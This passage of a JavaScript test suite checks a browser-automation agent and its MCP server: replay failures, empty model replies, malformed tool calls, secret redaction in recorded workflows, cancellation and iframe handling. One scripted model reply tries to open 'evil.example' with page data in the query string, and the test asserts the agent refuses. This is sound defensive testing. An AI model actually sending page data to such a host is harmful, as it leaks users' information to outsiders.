    const failure = await replayWorkflow({ version: 1, steps: [
      { action: "get_text", args: { selector: "#out" } },
      { action: "click", args: { role: "button", name: "Missing" } },
    ] }, current, {}, executeTool, commandForTool).catch((error) => error);
    assert.match(failure.message, /replay step 2 \(click\) failed: no button named "Missing"/);
    assert.equal(failure.completed, 1);
    assert.ok(failure.artifacts.screenshot.startsWith(current.artifactsDir));
    assert.equal(await exists(failure.artifacts.screenshot), true);
  });

  it("never reports an empty model reply as a completed task", async () => {
    const schema = { type: "object", properties: { title: { type: "string" } }, required: ["title"] };
    for (const [message, options, status, answer, requests] of [
      [{ content: "" }, {}, "failed", "Model returned no tool call", 3],
      [{ content: "   " }, {}, "failed", "Model returned no tool call", 3],
      // Prose cannot satisfy a result schema.
      [{ content: "The title is Agent-fast fixture" }, { schema }, "failed", "The title is Agent-fast fixture", 3],
      // A model that answers in prose twice has given its answer.
      [{ content: "The title is Agent-fast fixture" }, {}, "completed", "The title is Agent-fast fixture", 2],
      // done written in the same reply as an action that then failed is not accepted.
      [{ tool_calls: [toolCall("frame", { target: "#missing" }), toolCall("done", { answer: "premature" })] }, {}, "failed", "Four consecutive tool calls failed", 2],
      // A tool call written as JSON text is still a tool call.
      [{ content: 'Here: {"name": "done", "parameters": {"answer": "from text"}}' }, {}, "completed", "from text", 1],
    ]) {
      modelScript = [message];
      modelRequests = 0;
      const result = await runAgent({ task: `Open ${origin} and return its title`, act: false, maxSteps: 10, keepOpen: false, ...options },
        { ...config("browser-agent-silent", "read-only"), artifactsDir: await scratch() }, modelConfig());
      assert.equal(result.status, status, JSON.stringify(message));
      assert.equal(result.answer, answer);
      assert.equal(modelRequests, requests);
      assert.equal(result.evidence.title, "Agent-fast fixture");
      if (status === "failed") assert.equal(await exists(result.artifacts.screenshot), true);
    }
  });

  it("recovers from malformed tool arguments and marks truncated page data", async () => {
    modelScript = [
      { tool_calls: [toolCall("get_state", "{not json")] },
      { tool_calls: [toolCall("get_text", { selector: "body" }), toolCall("unknown_tool", {})] },
      { content: "thinking out loud" },
      { tool_calls: [toolCall("done", { answer: "recovered" })] },
    ];
    const result = await runAgent({ task: `Open ${origin}/long and summarize it`, act: false, maxSteps: 6, keepOpen: false },
      config("browser-agent-recover", "read-only"), modelConfig());
    assert.equal(result.status, "completed", JSON.stringify(result.answer));
    assert.equal(result.answer, "recovered");
    assert.equal(result.steps, 4);
    const toolMessages = modelBodies.at(-1).messages.filter((message) => message.role === "tool");
    assert.match(toolMessages[0].content, /not a valid JSON object/);
    const page = JSON.parse(toolMessages[1].content);
    assert.match(page.data.text, /\[truncated [0-9]+ characters\]$/);
    assert.match(toolMessages[2].content, /unknown tool/);
  });

  it("keeps the model on the sites named in the task and records robust workflows", async () => {
    modelScript = [
      { tool_calls: [toolCall("open", { url: "https://evil.example/?q=page-data" }), toolCall("tab_new", { url: "https://evil.example/" }, "tab")] },
      { tool_calls: [toolCall("done", { answer: "stayed" })] },
    ];
    const scoped = await runAgent({ task: "Summarize the current page", act: false, maxSteps: 4, keepOpen: false },
      config("browser-agent-scope", "read-only", []), modelConfig());
    assert.equal(scoped.status, "completed");
    const refused = scoped.trace.filter((entry) => entry.action === "open" || entry.action === "tab_new");
    assert.equal(refused.length, 2);
    for (const entry of refused) assert.match(entry.result.error, /outside the sites named in the task/);
    assert.equal(scoped.evidence.url, "about:blank");

    const directory = await scratch();
    const path = join(directory, "recorded.json");
    modelRequests = 0;
    modelScript = [
      { tool_calls: [toolCall("click", { target: "@e77" }), toolCall("fill", { target: "@e2", text: "secret-value" }), toolCall("click", { target: "@e3" }, "go")] },
      { tool_calls: [toolCall("done", { answer: "recorded" })] },
    ];
    const recorded = await runAgent({ task: `Open ${origin} and search`, act: true, maxSteps: 4, keepOpen: false, saveFlow: path },
      config("browser-agent-record"), modelConfig());
    assert.equal(recorded.status, "completed", JSON.stringify(recorded.trace));
    const saved = await readFile(path, "utf8");
    assert.doesNotMatch(saved, /secret-value|@e/);
    assert.deepEqual(JSON.parse(saved).steps.filter((step) => step.action !== "snapshot"), [
      { action: "open", args: { url: `${origin}/` } },
      { action: "fill", args: { text: "{{value1}}", role: "textbox", name: "Search" } },
      { action: "click", args: { role: "button", name: "Go" } },
    ]);
    const current = config("browser-agent-replay");
    await replayWorkflow(await loadWorkflow(path), current, { value1: "again" }, executeTool, commandForTool);
    assert.equal((await executeTool(call("assert_text", { selector: "#output", text: "Clicked: again", timeout: 1000 }), current, true)).success, true);
  });

  it("answers ping during a long action, cancels it, and isolates default sessions", async () => {
    const session = "browser-mcp-concurrent";
    sessions.add(session);
    const client = await startMcp(["--session", session, "--allowed-domains", "127.0.0.1"]);
    try {
      assert.equal((await client.tool("agent_fast_open", { url: origin })).result.isError, false);
      let answered = false;
      const slow = client.tool("agent_fast_wait_for", { selector: "#never", timeout: 4000 }).then(() => { answered = true; }, () => {});
      const slowId = client.lastId();
      const queued = client.tool("agent_fast_get_title").then(() => { answered = true; }, () => {});
      const queuedId = client.lastId();
      const started = Date.now();
      assert.deepEqual((await client.request("ping")).result, {});
      assert.ok(Date.now() - started < 1500, "ping waited behind a browser action");
      client.notify("notifications/cancelled", { requestId: queuedId });
      client.notify("notifications/cancelled", { requestId: slowId });
      const title = await client.tool("agent_fast_get_title");
      assert.equal(title.result.content[0].text, "Agent-fast fixture");
      assert.equal(answered, false, "a cancelled request must not be answered");
      void slow; void queued;
    } finally { await client.close(); }

    const first = await startMcp(["--allowed-domains", "127.0.0.1"]);
    const second = await startMcp(["--allowed-domains", "127.0.0.1"]);
    try {
      assert.equal((await first.tool("agent_fast_open", { url: origin })).result.isError, false);
      assert.equal((await second.tool("agent_fast_open", { url: `${origin}/next` })).result.isError, false);
      await first.close();
      assert.equal((await second.tool("agent_fast_get_title")).result.content[0].text, "Fixture next");
      const shot = await second.tool("agent_fast_screenshot");
      assert.equal(shot.result.content[1].type, "image");
      assert.equal(Buffer.from(shot.result.content[1].data, "base64").subarray(1, 4).toString(), "PNG");
    } finally { await first.close(); await second.close(); }
  });

  it("interacts with controls inside a site-isolated cross-origin iframe", async () => {
    const current = config("browser-cross-origin", "act", ["127.0.0.1", "localhost"]);
    const opened = await executeTool(call("open", { url: `${origin}/cross` }), current, true);
    assert.equal(opened.success, true, JSON.stringify(opened));
    // Locating by role and name waits for the frame to render and reaches inside it.
    const filled = await executeTool(call("fill", { role: "textbox", name: "Frame search", text: "cross-origin passed" }), current, true);
    assert.equal(filled.success, true, JSON.stringify(filled));
    // The main-document snapshot contains the cross-origin frame's controls.
    const snapshot = await executeTool(call("snapshot"), current, true);
    assert.match(snapshot.data.snapshot, /textbox "Frame search"/, JSON.stringify(snapshot));
    assert.equal((await executeTool(call("press", { key: "Enter" }), current, true)).success, true);
    // Semantic locators reach into the frame too.
    assert.equal((await executeTool(call("fill_label", { label: "Frame search", text: "-7" }), current, true)).success, true);
    assert.equal((await executeTool(call("press", { key: "Enter" }), current, true)).success, true);
    const frame = snapshot.data.snapshot.match(/Iframe "Embedded app"[^\n]*ref=(e[0-9]+)/)?.[1];
    assert.ok(frame, snapshot.data.snapshot);
    assert.equal((await executeTool(call("frame", { target: `@${frame}` }), current, true)).success, true);
    const matched = await executeTool(call("assert_text", { selector: "#result", text: "-7", timeout: 1000 }), current, true);
    assert.equal(matched.success, true, JSON.stringify(matched));
    assert.equal((await executeTool(call("frame", { target: "main" }), current, true)).success, true);
    assert.equal((await executeTool(call("click_text", { text: "Frame button" }), current, true)).success, true);
    assert.equal((await executeTool(call("frame", { target: `@${frame}` }), current, true)).success, true);
    assert.equal((await executeTool(call("assert_text", { selector: "#result", text: "frame clicked", timeout: 1000 }), current, true)).success, true);
  });

  it("keeps MCP alive when its browser daemon terminates", { skip: process.platform === "win32" }, async () => {
    const session = "browser-mcp-engine-loss";
    sessions.add(session);
    const client = await startMcp(["--session", session, "--allowed-domains", "127.0.0.1"]);
    try {
      assert.equal((await client.tool("agent_fast_open", { url: origin })).result.isError, false);
      const pidPath = join(homedir(), ".agent-browser", `${session}.pid`);
      const pid = Number((await readFile(pidPath, "utf8")).trim());
      assert.ok(Number.isSafeInteger(pid) && pid > 1 && pid !== process.pid);
      process.kill(pid, "SIGTERM");
      const deadline = Date.now() + 5000;
      while (await readFile(pidPath, "utf8").then(() => true, () => false)) {
        assert.ok(Date.now() < deadline, "test daemon did not shut down");
        await new Promise((resolve) => setTimeout(resolve, 10));
      }
      assert.deepEqual((await client.request("ping")).result, {});
      assert.equal((await client.tool("agent_fast_open", { url: `${origin}/next` })).result.isError, false);
      assert.equal((await client.tool("agent_fast_get_title")).result.content[0].text, "Fixture next");
    } finally { await client.close(); }
  });
});
